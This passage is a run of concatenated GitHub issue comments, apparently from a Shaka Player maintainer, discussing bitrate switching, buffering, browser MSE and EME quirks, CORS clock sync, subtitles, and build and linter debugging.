at the current time without clearing the source buffer.  SourceBufferManager has two different layers it can query: a map (soon to be list) of inserted segments, and the buffered time ranges of the underlying SourceBuffer.  If you were able to say, on switch, that we should forget all (or most) of the content we've already inserted, but not remove it from the SourceBuffer, the result would be that we would start downloading segments that replace those already in the SourceBuffer, but playback wouldn't be interrupted.\n. You could estimate the best value for X based on the new bitrate & current bandwidth estimate if you wanted to.  X = sizeOfSegmentInSeconds * newBandwidthRequirement / currentBandwidthEstimate * fudgeFactorGreaterThanOne.  This would be a little larger than the amount of time it would take to download the first segment from the new representation.\n. v1.4.0 is out now, which no longer clears the buffer by default when switching bitrates.  A custom IAbrManager implementation can decide whether or not to clear the buffer via the clearBuffer parameter to IVideoSource.selectVideoTrack().\nWe do not have an API to clear the buffer starting X seconds ahead, since we do not have an IAbrManager implementation that would make use of it at the moment.  That being said, I'd be happy to either add this to our queue to work on for v1.5.0, or accept a pull request for it, whatever you prefer.\nDesign-wise, perhaps we should have a secondary API along-side selectVideoTrack() like clearBuffer().  Then you could compose the two without making selectVideoTrack more complicated:\nvideoSource.clearBuffer(video.currentTime + 10, Number.POSITIVE_INFINITY);\nvideoSource.selectVideoTrack(newTrackId);\n. See also tests added in 9e0b48b to cover this.\n. That is interesting.  Architecturally, our intent is for all bitrate decisions to be made by the implementation of IAbrManager.  I don't see an obvious path for IAbrManager to get information about timeouts, though, and I don't think I want to add complexity to the basic built-in implementation (SimpleAbrManager).\nBut just to make sure we're operating from a good starting place, are you certain that the settings which trigger this scenario are sound?  Does your range-request timeout does not account for how long a segment is?  For example, if each segment is 10s of content, and you are maxing out the user's bandwidth with that representation, you can easily expect it to take close to 10s to download that segment.\nWhat's worse, depending on how your content is encoded, in certain scenarios the player would download a range of multiple segments in one HTTP request.  So even with 5s segments, a 30s minBufferTime would require 6 to be downloaded at once on switch.  (FWIW, we're changing this in ongoing work on #51 right now.  Soon, there will be no more multi-segment requests.)\nIf you're sure your parameters make sense, I would recommend two things.  First, wait for the next patch to come through on #51, then retest and see how the system behaves.  Second, if the behavior is still poor, let's find a reasonable way to get timeout information to IAbrManager.  That way, your custom IAbrManager implementation could use timeouts as a signal to down-shift.\n. I definitely want IAbrManager to be able to select bitrates based on buffer fullness.  This could easily be done with a manager which holds a reference to the video element.\nIt could (conceivably) even ignore bandwidth estimates completely and only poll how far ahead of video.currentTime has been buffered according to video.buffered.  The fact that we don't clear the buffer (by default) or overwrite anything (at all after the next patch) means that AbrManager could change bitrates as often as it wants without impacting streaming much.\nFrequent visual quality changes are arguably a bad user experience, but the point is that if your preferred ABR algorithm wants to make bitrate decisions all the time, we should enable you to try that and not interact badly with such an algorithm at the Stream level.\nAs for canceling XHR, that's no problem.  See shaka.util.AjaxRequest.prototype.abort() and shaka.media.SourceBufferManager.prototype.abort().  I believe calling this.sbm_.abort() in Stream.switch() would have the effect you want.\n. In v1.4, the application would inject an IAbrManager as the fourth argument to new DashVideoSource().  At that point, you should have a video element available, so you could give the video element to the ABR manager in the manager's constructor.  If you want, you could also contribute the buffer-based AbrManager implementation to live along-side SimpleAbrManager (which may not be the best name once there's something to contrast it with).\n. v1.4.0 is out now.  Please let us know whether or not the new APIs resolve this issue for you.\n. @jonoward This issue has been stale for some time, so I'm going to assume that everything is copacetic with the new APIs we introduced in v1.4.x.  Please feel free to reopen this issue or start a new one if you need more than what what we discussed in this bug.\n. As we start working on the design of Shaka v2.0, it seems that stats visualization is something that would fit better as a plugin in the new architecture, rather than part of the demo app that we maintain.\n. Sorry for the delay.  I was busy on other projects for a bit, and I'm getting caught up now.\nBuffer length in this PR is fine with me.  Thanks so much for taking this on.\n. A legend might also be nice.  It is very hard to figure out what these lines are at first glance without referring to the source code.\n. Closing, please see comments in #98.\n. The appspot demo does not have an uncompiled mode at the moment, so it does not generate logs.  Sorry about that.\nPlease try that manifest on a local build and see what the logs have to say.  I tried your manifest (without your content, obviously), and Shaka Player was able to parse all of the Representations just fine.  I see 5 video tracks listed under \"Available video tracks\" in the test app UI.\nIs the problem that you only have one track to choose from, or that it never switches?  Which track does it play?\n. Yes, please share your assets.  We have not tested in Opera before, so that sounds like an important detail.\nCould you also please share the full JavaScript log from your session?  Not just errors, but warnings and even mime-type-support info could be very important.\n. Interesting.  Thanks for investigating, Nick!\nI'm confused about one point.  Is the problem that we're setting currentTime too early (while the HTMLVideoElement is in the wrong state) or that we're setting currentTime to the exact same value that it already has?\nI ask because in your PR, the subject is \"defer assigning\", but it seems to be checking the value instead of changing the timing.\n. Yeah, I'm concerned #103 isn't the right fix.  If it's a state issue, then some aspect of that state should be involved in the fix.\n103 only really fixes the problem if it's a matter of Firefox not permitting you to set currentTime to the same value it already has, which sounds like wacky behavior to me.  I tend to think Firefox's implementation is smarter than that.\nThere are some streams which do not start at 0.  I don't have a sample off-hand, but if you try something like this:\nthis.video.currentTime = streamStartTime + 1;\nAnd it still throws an error, it's definitely a state problem and #103 isn't the right fix.  If that does somehow fix it, we just need to reword the commit message in #103 and merge it.\n. Ah, I just ran across something that may be relevant.  See the change in stream_video_source.js in blinkbox/shaka-player@79a80f0.  It may be that Firefox and IE11 both dislike how/when we set currentTime.  You may want to try the same tweak in stream_video_source.js that Blinkbox is using for IE.\n@jonoward: Can you offer us any insight on this?  Is IE's behavior similar to the Firefox behavior described in this issue?\n. PR had to be reverted, so reopening this issue.\n. @nickdesaulniers, I just tested with the latest nightly of Firefox, but I'm having trouble reproducing on my Linux box.  The stream you mentioned in the bug report is MP4, and Firefox 42 doesn't seem to support MP4 on Linux.\nI tried the WebM \"Angel One\" test asset we have built-in, and it plays just fine on Firefox 42.  Do you see this bug with all assets in general, or just with the \"Tears of Steel\" MPD you linked to?\n. I flipped several MSE-related flags, including one about MSE WebM.\nInteresting that it works in FF40.  Could we perhaps raise a bug with someone at Mozilla about the behavior of FF41 and FF42?  If the new behavior is more spec-correct, we could certainly revisit FF41 support in Shaka Player after confirming that this is, in fact, intended behavior for Firefox.  But I'd hate to discover that we spent a lot of time and energy sweeping a bug under the rug with a workaround.\nHas Mozilla decided when FF with ship with MSE enabled by default?\n. Awesome!  Looking forward to FF42, then.\n. @cpearce, I think we need to work through non-EME playback in Firefox first, then circle back and polyfill the EME implementation as needed to get the ClearKey-encrypted samples working.  I will reassess with Firefox 40 and perhaps you and @nickdesaulniers can help us work through the MSE incompatibilities first.\n. @nickdesaulniers @cpearce \nHere's my test setup:\n- latest Shaka Player sources (not latest release version)\n- Firefox 40 and 41 (downloaded this morning) on Goobuntu Linux\n- settings on both browsers:\n  - media.mediasource.enabled = true\n  - media.mediasource.format-reader = true\n  - media.mediasource.format-reader.mp4 = true  (only appears on FF 41)\n  - media.mediasource.mp4.enabled = true\n  - media.mediasource.webm.enabled = true\n  - media.mediasource.whitelist = false\n  - media.mediasource.youtubeonly = false\nTests:\n- the WebM TNG clip (http://localhost/shaka/?tng;dash)\n  - FF 40: does not autoplay, you must click the play button\n    - (autoplay = true, paused = true, playbackRate = 1)\n  - FF 41: does not autoplay, goes into a buffering state when you click the play button\n    - (autoplay = true, paused = true, playbackRate = 0)\n- the unencrypted \"car\" clip (http://localhost/shaka/?nocenc;dash)\n  - FF 40: does not play\n    - fails an assertion in source_buffer_manager.js (this.sourceBuffer_.buffered.length > 0 after appendBuffer() called and an \"updateend\" event is received)\n    - it seems that the browser reports MP4 support, and reports successful appendBuffer(), but nothing was actually appended\n  - FF 41: does not play\n    - Media resource mediasource:http://localhost/SOME_UUID could not be decoded.\n  - should FF on Linux report no MP4 support instead?\nWhere should we start?\n. @cpearce @nickdesaulniers Whoops, I did not read carefully enough.  I missed the fragmented MP4 settings:\n- media.fragmented-mp4.enabled = true\n- media.fragmented-mp4.exposed = true\n- media.fragmented-mp4.ffmpeg.enabled = true\nWith these settings added, I now get:\n- the WebM TNG clip (http://localhost/shaka/?tng;dash)\n  - FF 40: does not autoplay, you must click the play button\n    - (autoplay = true, paused = true, playbackRate = 1)\n    - it seems that programmatically calling video.play() from Player.prototype.onWatchdogTimer_ has not effect on video state\n    - calling video.play() from the console or a click handler works\n  - FF 41: does not autoplay, goes into a buffering state when you click the play button\n    - (autoplay = true, paused = true, playbackRate = 0)\n- the unencrypted \"car\" clip (http://localhost/shaka/?nocenc;dash)\n  - FF 40 and FF 41: does not autoplay, you must click the play button, same as WebM/FF40 above\nAdditional test:\n- select \"GPAC/SegmentList (conformance test)\" and load stream\n  - this uses a non-zero start time and requires timestamp correction after startup\n  - setting this.video.currentTime = streamStartTime in StreamVideoSource.prototype.startStreams_ throws InvalidStateError\nQuestions:\n- why was MSE MP4 support reported without a fragmented MP4 decoder enabled?\n- why did appendBuffer report success but have nothing in buffer?\n- why is setting currentTime in startStreams_ invalid?\n- why can't we programmatically play() the video?\n  - is this disabled in FF on desktop like it is on Chrome for Android?\n  - https://github.com/google/shaka-player/blob/master/tutorials/player.html#L286\n  - http://crbug.com/159336\n. This same condition should be triggered without setPlaybackStartTime if you are playing live content.  Live playback starting at t=0 would be vanishingly unlikely.\n. We've found a way to fix it, but it will have to wait for v2.0.  Experimentally, if we defer setting video.currentTime until after at least one init segment is in buffer, the latest stable FF seems to work just fine.  However, since Stream.onUpdate_ uses video.currentTime to start fetching segments, we can't simply defer without making many more changes.\nShaka v2.0 will be structured differently and this should not be an issue.\n. @jyavenard \n\"When the video/media element is created, and no mediasource has been created and attached it doesn't have a selected media resource yet.\"\nThat doesn't describe what happens in Shaka, though.  MediaSource has been created and attached before setting currentTime.  What we do (1.x) is set currentTime before appendBuffer().\nWhat I am suggesting we do differently in 2.0 is set currentTime only after the first call to appendBuffer() completes.\n. Looks like the FF bug mentioned immediately above has been closed as fixed.  I haven't tested this fix myself, but since IE11 suffers the same problem, this Shaka issue will have to stay open until we can defer currentTime.\n. Yay for Safari.  :-)\n. Thanks for the revisions.  I really appreciate you working on this patch.\n. Looks good to me.  Would you please give a quick read through CONTRIBUTING?  You'll need to sign the license agreement, and add yourself to AUTHORS & CONTRIBUTORS.\n. Excellent.  Thanks for your contribution!\n. Hi Nick, sorry to have to say, but this patch breaks live streaming.  You can see this by running this subset of the integration tests: spec_runner.html?spec=Player%20live\nThe symptom is that these live streams simply do not start at all, at least on Chrome.  Unfortunately, I have to revert your patch.  I really do appreciate you getting Shaka Player working nicely on Firefox, and I hope you're still willing to try again when you have the time.\n. Thanks, Nick.  We want to see this working well on Firefox, too, but haven't been able to make it a priority yet to figure out why Firefox's HTML5/MSE implementation seems to behave a little bit differently from Chrome's.  So your efforts are much appreciated.\n. When I play this content, without seeking, I find that the video stalls at 9 seconds.  When I've seen this behavior in the past, the problem is usually that the license we received did not contain the correct key.\nUnless you specify a license server URL in the test app UI, the license server used is http://widevine-proxy.appspot.com/proxy .  My guess is that this is not the correct license server for this content, and that we get 9 seconds of playback because the first 10 seconds of the content are clear.\nI can't reproduce the behavior you are describing.  Is there a license server URL I should be using to override the default?\n. @sarge:  I've done some experimenting with this, and it seems that a compile for me on a 64-bit Ubuntu machine takes around 420MB of RAM.  My system's default for max heap size is quite large, around 8GB.\nI tried to find the limit by lowering the maximum from 500MB down to 100MB, but it seems that for me, Closure is able to adjust and fit inside of 100MB of RAM if I tell Java that this is my maximum heap size.\nI've had successful builds as low as 35MB, but at 30MB it fails for me.\nWhat are your system's defaults?  Please reply with the output of:\njava -XX:+PrintFlagsFinal -version | grep HeapSize\nI could just set it to 512MB for everyone, but I'm starting to think that would just be a band-aid on a problem I don't really understand yet.\n. @sarge, is this still an issue for you?  I have still not been able to reproduce.\n. Thanks, @sarge \n. Also, please read CONTRIBUTING and follow the instructions there.  You'll need to sign a license agreement and add yourself to AUTHORS & CONTRIBUTORS.  Thanks!\n. Sounds good on the CLA.  Just ping me when you're ready for me to take another look, and thanks for your contribution!\n. If you can fix the quoted console['assert'] and change support.js's double quotes to single quotes, everything else looks good to me.  Thanks!\n. I spoke too soon.  You'll also need to fix the errors reported by the compiler & linter.  Just run ./build/all.sh to see them:\n./build/all.sh\n0 error(s), 0 warning(s), 98.1% typed\n----- FILE  :  /var/lib/jenkins/jobs/Shaka Player GitHub PR Build/workspace/lib/debug/asserts.js -----\nLine 46, E:0220: No docs found for member 'shaka.asserts.patchAssert_'\nLine 55, E:0011: Missing semicolon after function assigned to a variable\n----- FILE  :  /var/lib/jenkins/jobs/Shaka Player GitHub PR Build/workspace/lib/debug/log.js -----\nLine 72, E:0220: No docs found for member 'shaka.log.patchConsole_'\nLine 82, E:0011: Missing semicolon after function assigned to a variable\nFound 4 errors, including 0 new errors, in 2 files (107 files OK).\n. Looks great, just one small tweak.\n. I'm so sorry.  I know closure is new for lots of people.  I meant that only @private is needed for a private function with no arguments and no return value.  We don't generally use @type for functions unless it's a callback.\n. Looks good to me.  I'm going to see if the CI system I'm experimenting with will pick this up and test it:  ok to test\nIf not, I'll give it a manual test run and merge later today.  Thanks for your hard work on this!\n. CI isn't working yet, but I ran the tests manually and everything's passing.  Thanks for the contribution!\n. Thanks for the request.  At the moment, we rely on the browser's subtitle support.  On Chrome or Firefox, Shaka Player will do WebVTT.\nFor context, Shaka Player has made a point of not doing any DOM manipulation or CSS so far.  Both of those things would have to change in order for us to render any subtitle format not directly supported by the browser.  It's doable, but would require some architectural changes first.\nWe can't fit this into our schedule right now, but we'll keep it in mind.\n. Hi Doug,\n1. We are implementing partial TTML 1 support.  We are using the TTML 1 spec, but we are only implementing what can be represented in the browser's native cues interface.  The means we can't implement extents or origins based on pixel sizes, animation, etc.\n2. Shaka v2 betas already support chunked/segmented subtitles, but only in the specific formats we parse.  Currently, that's the textual forms of WebVTT and TTML.  We do not yet support text streams embedded in MP4 (#277 and #278).\nOne important note about segmented text is that just like audio and video, segments must exist to cover the entire period.  If there are no cues to display during a given segment's time, the segment would be a valid WebVTT or TTML file, but would contain no cues.\n. Thanks for the report.  Can either of you supply test content I could use to reproduce and debug the problem?  If it's something you can't post in public, an email would be fine.\n. I can now reproduce the issue.  I'll see what I can do to fix it.  Thanks!\n. @sanbornhnewyyz, I can't reproduce the behavior in your earlier comment, where removing the break statement results in too many tracks.\nIn the test content you gave me, there are two audio languages, one audio bitrate per language, and three ContentProtections elements.  I added a check for PlayReady to app.interpretContentProtection_ in case it was important to have multiple DrmSchemeInfos as well.  With this setup, if I remove the break in chooseEncrypted_, I get exactly two audio tracks.\nIf I edit the manifest and add an additional audio Representation to each AdaptationSet (low bandwidth such that they are not selected by default), I now see four audio tracks as I would expect.  I can't seem to get them to duplicate per-ContentProtection or per-DrmSchemeInfo.  So for the moment, it seems as if removing the break statement is, in fact, the correct fix.\nIs there something I'm missing to reproduce the \"too many tracks\" problem you described?\n. Did some archaeology:  It seems this bug has always been there, ever since we started using requestMediaKeySystemAccess back in February (a253872).\nRemoving the break statement seems to me to be the correct fix.  You should be able to choose all matches for key system & codec.  The content from Sanborn that I've tested seems to be fixed by this.\nAre there any objections to this fix?  Or counter-examples where it does not work as it should?\n. No worries!  We want to get this solved for you.  Does this happen with the last sample you sent me, or will I need a new sample to reproduce?\n. Yes, I can play it in the test app.  I just paste the URLs you gave me into the test app's manifest and license server fields.\n. No problem.  I'll try to replicate that and see if this is something we should account for somehow when processing the callback's results.\n. Looks like something we can/should take care of in EmeManager.  I've got a fix in review internally that seems to handle duplicate DrmSchemeInfos more gracefully.  Thanks for helping me repro it.\n. Okay, then if you have what you need, I'll close this issue.  Thanks!\n. I can reproduce your results even with the latest Shaka Player sources, but I don't see anything obviously wrong with Shaka Player here.  Does this MPD work on any other web-based DASH player in Chrome?\nIt could be that the content is not encoded correctly, which might cause Chrome's MSE implementation to reject it even though Chrome's decoder will handle it as a progressive playback.  I can only speculate.\nWe do have a working VP9 sample in the test app, and I don't see any differences in the manifests.  So the difference must be in the content itself.\nIf another MSE-based player can make this work in Chrome, then it would probably be a Shaka Player bug.  If that's the case, please re-open this bug and we'll investigate.  For now, Shaka Player appears to be working as intended.\nIf the content is correctly encoded, it could be a Chrome bug, which you could file at http://crbug.com/.  Feel free to CC me if you do.\nIf the content is broken, then the ffmpeg instructions from the WebM project may be at fault, in which case you should contact the WebM team.  I'm not sure where their bug tracker is off-hand.\n. @johnluther, good find!  Have you filed on http://crbug.com/ ?  I'd love to subscribe to that issue and keep informed on their progress.\n. Awesome, thanks for the link!\n. Much of the infrastructure is in place, but I am pushing this to v1.6.0 to officially ship multiple build configurations to NPM.\n. Deferring to v1.6.0.\n. @tsinghal18 What version of Shaka Player are you using?  What specific symptoms are you seeing?\n. EDIT: corrected formatting on code snippets which had previously eaten the top line of each\nWe discussed this yesterday internally, and decided that settings in configure() will not automatically be cleared, but setPlaybackStartTime should be reset between playbacks.  For example:\nplayer.setPlaybackStartTime(10);\nplayer.load(source1);  // starts at 10s\n// ... later ...\nplayer.load(source2);  // starts at 0s\nvs:\nplayer.setPlaybackStartTime(10);\nplayer.load(source1);  // starts at 10s\n// ... later ...\nplayer.setPlaybackStartTime(30);\nplayer.load(source2);  // starts at 30s\n(Note that it isn't reset between playbacks now, but I planned to change that today.)\nIf you disagree on any of this, please let me know.  I would welcome your opinions on the matter.\nDo you feel like start time should be cleared between playbacks?\nDo you feel like setPlaybackStartTime should be replaced by a key in configure or should be independent?\n. That was my rationale, yes, but I could be convinced otherwise if this doesn't fit with your use-case.\n. Okay, then I'll re-open this and close it when I've fixed the start time to clear automatically.\n. I'm going to try out the new CI system on you.\n. Okay, I'm turning it over to Tim to finish review.\n. No worries, I already took care of it in 9ae0c1e.  Thanks, though!\n. @randeeppr We are still waiting for your feedback on this.\n- Is this still an issue for you?\n- Does the content play in 1.3.x?\n- Are you able to share sample content with us that triggers this bug for you?  If not publicly, then a private email will suffice.\n. We have found that we do, in fact, have a bug in Shaka Player around our handling of presentationTimeOffset, specifically for live streams.  I've updated the tags and title to reflect this, and I'm reopening the issue until we can publish a fix.\n. Unfortunately, we don't have the bandwidth right now to add this.  It basically amounts to subtitle manifest outside of the main content's manifest, and it doesn't fit into our current architecture.\nIt is trivial to add vtt subtitles to a DASH manifest, and if you can't modify the manifest, you can always use addExternalCaptions() in the mean time.\n. Closing as a duplicate of #279, which is more general and covers all HLS support.\n. @tdrews, it seems the idea is that we have a static manifest, but the server has some front-end that does authentication based on headers or parameters before serving the static content.\nSeems as reasonable as the rest of the feature request, so re-opening.\n. @sridhard, it is definitely available and has been implemented for some time now.  (This issue has been closed for over one year.)\nSince you already filled a new issue for help using this feature (#531), let's discuss there.  Please don't spread our conversation over multiple issues.\n. @kfwerf I wanted to check in and confirm what you're doing in your fork to see how well aligned we are with Shaka 2.  Your sample manifest uses text/vtt, and your implementation seems to use browser's built-in VTT support.  So these are complete WebVTT text files, as opposed to VTT cues packaged in ISO BMFF segments?\n. Sorry for the confusion.  We have supported segmented text in general and \"text/vtt\" in specific since February.  Support for \"application/mp4; codecs=wvtt\" was added 3 days ago.\nSupport for segmented text in general is a consequence of how we load text in v2, in a MediaSource-like way.  This is independent of the individual parsers.  We now have parsers for both text/vtt and VTT in MP4.\n. @jozefchutka Do you still get these exceptions when you follow advice from @tdrews about the unload promise?\n. @jozefchutka \nFor what it's worth, the Player is designed to be reusable.  You are welcome to create new Player instances if you like, but if there are still async processes happening with your video tag, attaching a new Player to the same tag before that completes may cause problems for you.\nIf you intend to create new Players, you should either wait for the old one to be destroyed or add remove the old video tag from the DOM and create a new one for the new Player.  However, given that we designed Player to be reusable, I really can't see any reason to do it.  Plus, this process would still be async.\nThe asynchronicity of unload() cannot be avoided due to the asynchronicity of EME APIs that must be used during unload().\nMy recommendation is to call load() with a first source, then when you want to change sources, just call load() again.  load(), which is async, will call unload() internally if need be and wait for the result.  If you need to destroy the player, just call destroy() instead of unload() and destroy().  The destroy() method, like load(), will call unload() internally if needed.\nDoes this work for you?  If not, can you explain your use case?  I don't understand why a real application would do the things you are doing in your sample above.\n. @jozefchutka, I see.  Well, we did not consider rapid creation and destruction as a use case, but it seems reasonable to expect destruction to interrupt async processes and cause their failure.  Any Promises returned to you would be rejected, and your application would then have to avoid calling methods on that instance from any handlers you attach to that Promise.\nFor what it's worth, I would still recommend against calling unload() and then destroy() synchronously.  Just destroy() should suffice, and will trigger the same logic as unload() during the destruction process.\nI notice you say that these exceptions could \"easily be avoided\".  Does that mean you have already looked into it and worked out the fix?  Do you have a patch ready?  Or is this something you would still like us to work on?\nThanks,\nJoey\n. I have a fix for this in review, including new Player tests to cover your use case.  Thanks for the report!\n. Found one more case we missed.\n. @jonoward I am unable to reproduce this on my cygwin system.  I tried with git's core.autocrlf option unset, set to true, and set to false.  With each setting, I did a fresh clone of the sources and then ran ./build/lint.sh, and all three times I got 0 errors.\nIf you can still reproduce this, can you please send me a tarball of your working tree for comparison?\n. Basically everything but bash, python, and java is contained within the working tree, including compiler & linter.  I'll try with your tarball and see if I can repro.  If so, I'll dissect the differences between your working tree and my own.  Otherwise, we can try to debug and find the environmental difference.  Thanks!\n. Looks like a newline problem.  Your whole repo has a different newline style than mine.  I'm getting 8MB from \"git diff\".  :-)\nWhat tools are you using?  Are you using the cygwin version of git?\nThere's a .gitattributes file to force unix-style newlines, but in your case, it appears not to have worked.  I'm wondering if you have a checkout that predates that file or if it was otherwise ignored somehow.  If you do a fresh clone of the repository, does this linter problem go away?\n. Actually, I'm getting no linter errors even with the DOS newlines.  Since the linter is written in python, perhaps its your python implementation?  Are you using the cygwin version of python?\n. Sorry for the delay.  I missed this in my inbox.  I'm running cygwin python 2.7.10.\n. Ah, I see.  Do we need to change the way we import the package to make sure the local copy is used?\n. Never mind, I think the answer is yes.  In gjslint:\nsys.path.append(gflags_path)\nsys.path.append(linter_path)\nThose should probably be prepended instead.\n. Reproduced on Linux by globally installing closure_linter and then breaking it:\nsudo pip install https://closure-linter.googlecode.com/svn/trunk/\nsudo rm /usr/local/lib/python2.7/dist-packages/closure_linter/*.pyc\nsudo bash -c 'for i in /usr/local/lib/python2.7/dist-packages/closure_linter/*.py; do\n  echo None > $i\ndone'\n. Okay, this is now fixed.  Sorry it took me so long to recognize the real problem, and thanks both for the report and your help debugging.\n. This is out of our control.  The videoHeight / videoWidth attributes are implemented by the browser, not by us.  I believe they show the resolution of the current frame being displayed.  The adaptation event shows what the ABR manager has decided to fetch, which may lead what is being displayed.\n. This bug affects all previous versions.\n. Correction: affects all previous versions with offline support, which means v1.3.0+.\n. In your scenario, since you are removing the video from the DOM, you should call destroy() on the corresponding Player instance just before doing so.  This should stop playback and release the Player's reference to the video element such that the browser can GC the video.\n. Unfortunately, that's being emitted by Chrome directly.  It's harmless, but we can't silence it.  See this code in shaka.util.AjaxRequest.prototype.onReadyStateChange_:\n// This may not be available, depending on server configuration and CORS.\n  // For clock synchronization to work cross-origin, the server explicitly\n  // has to allow the client access to the \"Date\" header using the response\n  // header \"Access-Control-Expose-Headers\".\n  // It is also worth noting that this is not a fancy sync mechanism and\n  // does not account for round-trip times or latency.  For our purposes,\n  // subsecond synchronization is not really necessary.\n  var date = Date.parse(this.xhr_.getResponseHeader('Date'));\n  if (date) {\n    shaka.util.Clock.sync(date);\n  }\nSee also the clock sync and CORS sections of the docs on live playback, which state:\n\nIf your application operates same-origin, no special configuration is required for clock synchronization. If manifests come from another origin, your server must allow Cross-Origin Resource Sharing, also known as CORS. The response for the manifest must include the \"Access-Control-Expose-Headers\" header with \"Date\" in the list of values. If this is not given, the browser will not permit the application to read the Date header. Chrome will log an error message to the JS console saying \"Refused to get unsafe header\". (Note that this is coming directly from Chrome and cannot be silenced by the library.)\n\nHope that helps!\n. Sorry, no method for this currently.  You could add a method to IAbrManager & IVideoSource to trigger choosing new tracks.  Then, when new restrictions are set, Player could trigger this through the video source.\n. Brilliant, thanks!\n. Hi Jesper,\nThanks for the contribution!  I would be happy to accept this pull request, but I will need you to first read CONTRIBUTING.md and follow the instructions there.  In brief, you need to sign a click-through agreement with Google and add yourself to AUTHORS & CONTRIBUTORS.\nThanks again!\n. Thanks!\n. This bug is twofold.\nOne is a race in controls.js file between input events and timeupdate events.  This race is not an issue for some reason on desktop, but manifests on mobile.\nThe other bug is that we are only using mousedown/mouseup and need to add support for touchstart/touchend as well.\n. I can't tell from the title what the issue is.  Is this a bug or a feature request?  Can you please provide some details in the description?\n. @sanbornhnewyyz Not sure I completely understand.  To clarify, by \"beginning of the buffer\", do you mean the beginning of the buffered region?  As opposed to the beginning of the seek range (often 0s)?\nFor example, times 60s to 70s are in buffer, and we start rewinding.  Are you saying that in this case, you can't rewind to anything earlier than 60s?\n. @sanbornhnewyyz I see what you mean.  We used to have that behavior, but on closer inspection, this was lost in a refactor.  We will consider it a regression, but I don't have a timeline for the fix right now.  Stay tuned.\n. minBufferTime is defined by the DASH spec as the time that must be buffered before playback begins in order to achieve no-rebuffer playback with the bandwidths specified in the manifest.  So not only do we wait until minBufferTime to start up, it's not feasible to stream all the way to the live edge without accounting for minBufferTime.\nstreamBufferSize, on the other hand, defines how much data has to be in buffer before we stop fetching segments.  It's the buffering goal during playback, so it makes sense to have this larger than minBufferTime.\nSince you want low latency startup, you use small minBufferTime.  Since you want to get ahead of the game to avoid transient network slowdowns, you use a larger streamBufferSize.\nFor live streams at the edge, when streamBufferSize is larger than minBufferTime, you won't ever be able to get a full streamBufferSize of data in buffer (because it's not available yet).  But this setting will have an effect when you rewind and watch from behind the live edge.\n. After some discussion internally, we've realized that we are introducing a similar event ourselves ('trackschanged') as part of #67, but for a different purpose.  #67 is a high priority for 1.5.0, so if you're okay to wait a bit on this and adopt the next release, all you'll need to add is the listener on SimpleAbrManager.  Our version will fire any time the list of tracks changes, such as due to changes in Restrictions, key availability, or HDCP status.\nThoughts?\n. On Player configuration update, new Restrictions are pushed from Player to VideoSource, where they influence the state of StreamInfos and therefore the results of get*Tracks() calls.  So as soon as tracksChanged fires, any changes to the track list exposed through Player or VideoSource should be visible immediately.\n. The change for group support (689c2a4) is in, including the new 'trackchanged' event.  Please give that a try and rebase your pull request onto that.  Thanks!\n. Looks good to me.  Thanks!\n. Looks like you aren't the only one having issues with this.  There's a thread on the mailing list this morning about Safari 8 issues.\nWe don't test Safari 8 explicitly, but our aim is to support the browsers that support the required standards, such as MSE.\nIf this worked before, you can test in older Shaka Player releases using appspot.  For example, you can visit http://v1-3-0.shaka-player-demo.appspot.com/ to test v1.3.0.  Please test on older releases (1.4.0, 1.3.2, 1.3.1, 1.30, 1.2.4, ...) and let us know if you find a version that works on Safari.  We can debug from there.\n. Hi @milkisevil, were you able to test older versions of Shaka Player on Safari 8?  Do we have a regression?\n. Full Safari support is a goal of v2.0.\n. Shaka doesn't use WebGL.  Are you sure that's related?\nThe schedule in the design doc needs to be updated.  If you check our project milestones, our current target for a v2 beta is the end of February, with a full release by the end of March.\nYou can see progress to-date in the 'preview' branch.  We've been working our way upward, and we're getting very close to the top of the stack.\n. @jonobr1 Can you tell me where in the Shaka codebase this exception originates?  Is there a stack trace?  Are there any console logs from Shaka before this happens?\nAll of our automated tests for v2 so far are passing in Safari 8, but if we can understand what the issue is in v1, I'd love to publish a fix before v2 is out.\n. @jonobr1 so it seems now that we've confirmed that your WebGL issues are unrelated to Shaka.  Do you have issues on Safari 8 in the latest version of the standard demo app?\n. Update: I got my hands on Safari 8 and tried the latest release.  I found that Safari's CORS implementation is subtly different from Chrome's.  A CORS preflight request from Safari 8 includes the \"Origin\" header in its list of cross-origin request headers, while Chrome does not.\nI've updated the CORS settings on the server that hosts some of our test assets (Sintel, for example) to explicitly list \"Origin\" in its list of permitted cross-origin request headers.  This seems to fix download of those assets on Safari without updates to Shaka.\nPlayback still seems to be broken on Safari 8, but there are no error messages from the browser.  I'm not sure what the issue is with Safari 8.\nIn Safari 9, with the server update, playback of Sintel is now working.\nSome of the other test assets don't work on Safari, but those same assets also do not work on IE11.  (Both produce \"multiple buffered range\" errors from Shaka because they are seen by the browser as having discontinuous segments.)  My theory is that these test assets (the car clips, for example) are not 100% correct, but work on Chrome because Chrome's parsers and decoders are more flexible/forgiving than some others.\n. (Follow #224 for more on replacement assets for v2 which will play on all major browsers.)\n. Safari 8's MediaSource implementation has been determined to be incomplete.  Safari 9 works correctly.  Therefore we have decided to support Safari 9+ only.  Sorry for the inconvenience.  See also #294.\n. Good catch.  Essentially, the restrictions make it so that there are no usable tracks.  This isn't a scenario we had really considered, so we need to decide how we want the Player to behave if this happens.\nIn the mean time, at an application level, you should definitely not place external limits that result in all tracks being restricted and unusable.\n. Here's what seems to be happening.\n1) Your server changes availabilityStartTime to the current time every time the manifest is accessed.  This does not make sense, and as far as I can tell, does not represent a real use-case.  The availabilityStartTime should not constantly change in a real stream.\n2) Your server doesn't allow us to access the Date header for clock synchronization.  This means the availabilityStartTime may appear to be slightly in the future, which according to spec, means the stream is not yet available.  Allowing cross-origin access to the Date header on your server would help.\n3) Because minUpdatePeriod is huge (595 hours), we don't fetch a new manifest for 24 days.  If we did, thanks to your constantly-changing availabilityStartTime and clock desync, we would still see that it is in the future and the stream would still not be available according to the spec.\n4) The bug on our side is that we could wait for availabilityStartTime to pass and then reprocess the same manifest we already have.  This would allow playback to continue once the delta between the client & server clocks has passed.\nSo we will add code to wait for availabilityStartTime to pass and reprocess the manifest, and we strongly recommend you both allow Date header access and do not constantly change availabilityStartTime.\nSince this content does not appear to be realistic, I am pushing this out to a later milestone than the one we are currently working on.\n. We are having issues with test flakiness in general.  It has gotten better and continues to improve, but we still have some issues with the integration tests.  I'll run this PR on our bot and see how it goes.\nThank you so much for putting this PR together.  I'll review it as soon as possible.\n. Overall, this is great.  Thanks so much for putting this PR together.  Testing it exposed some bugs on our side as well (#177, for example).\n. Hi Jono,\nI'm sorry to report that I will have to put this review on hold until early October.  We're just swamped right now, but I'd like to plan on this being part of the v1.6.0 release.\nThanks so much for your contributions to this project!\n. I think we're nearly there.\nThe last version I tested (not 